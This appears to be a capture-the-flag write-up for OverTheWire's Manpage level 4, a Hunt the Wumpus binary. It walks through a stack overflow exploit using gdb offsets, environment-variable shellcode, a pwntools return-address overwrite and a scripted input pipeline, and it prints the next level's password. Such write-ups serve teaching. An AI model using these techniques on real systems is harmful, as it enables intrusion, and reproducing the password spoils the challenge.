# Manpage Level 4 → 5

## Goal

`manpage4` is a small implementation of the 1970s text adventure **Hunt the Wumpus**, and it has a stack-based buffer overflow hidden inside the "ATTACK" action: when the game asks for your lastname and you give it more than expected, the input overflows into the adjacent stack frame and you can overwrite a saved return address. You play the game far enough to reach the ATTACK prompt, then feed an overlong name.

## Concepts you'll learn

- That bugs can hide inside game logic — you have to *reach* the vulnerable code path, not just know it exists
- Two-step stack overflows: a long string fills buffer A, then that buffer's contents are copied into buffer B (different location, smaller size) → overflow happens in B
- Calculating offsets between two stack variables with `gdb`'s `&var` output
- Driving a program that wants interactive input via a scripted exploit with `pwntools`

## Walkthrough

### 1. Understand the source layout

In `gdb`, find the addresses of the two buffers involved. avishai's numbers:

- `inp[2048]` at `0xffffcb34`
- `lastname[...]` at `0xffffd038`

Distance: `0xffffd038 - 0xffffcb34 = 0x504 = 1284 bytes`.

The program copies `inp` into `lastname` at some point. If `inp` has 1284 bytes of something followed by more data, the excess overflows `lastname`'s stack frame.

### 2. Plant shellcode

Same env-var trick as earlier levels. Export `EGG` with NOP-sled + shellcode, find its address with the `getenv` helper:

```bash
$ export EGG=$(cat sc.bin)
$ /tmp/getenv EGG /manpage/manpage4
EGG = 0xffffd548
```

### 3. Build the payload

```python
# level4.py
from pwn import *
SHELLCODE_ADDR = 0xffffd548
payload = b"A"*1284 + b"B"*208 + p32(SHELLCODE_ADDR)
sys.stdout.buffer.write(payload)
```

Breakdown: `1284` bytes fills `inp` up to the start of `lastname`; **208** additional bytes fills `lastname` up to the saved return address; then `p32(SHELLCODE_ADDR)` overwrites EIP.

### 4. Play the game enough to reach ATTACK

The Wumpus prompts are deterministic if you pass a fixed seed. `-s 4` places the wumpus in a reachable room for a short sequence. avishai's input sequence:

- `N` (choose to play)
- `ATTACK` (the action that takes your payload-bearing input)
- `S` (shoot)
- `1`, `10` (rooms)

Putting it all together:

```bash
$ (echo "N"; echo "ATTACK"; python3 level4.py; echo "S"; echo "1"; echo "10"; cat) | /manpage/manpage4 -s 4
$ whoami
manpage5
$ cat /etc/manpage_pass/manpage5
sxmrfDKUtV
```

If the game sequence drifts (different seed, different rooms), spend a few rounds playing it interactively to find a path that ends at ATTACK before running the scripted version.

## The answer

The password for `manpage5` is:

**`sxmrfDKUtV`**

> ⚠️ OverTheWire may rotate passwords without notice. This value was correct at the time the level was solved — if it fails for you, re-solve the level using the method above rather than assuming the writeup is wrong.

## Reference

- Official level page: <https://overthewire.org/wargames/manpage/manpage4.html>
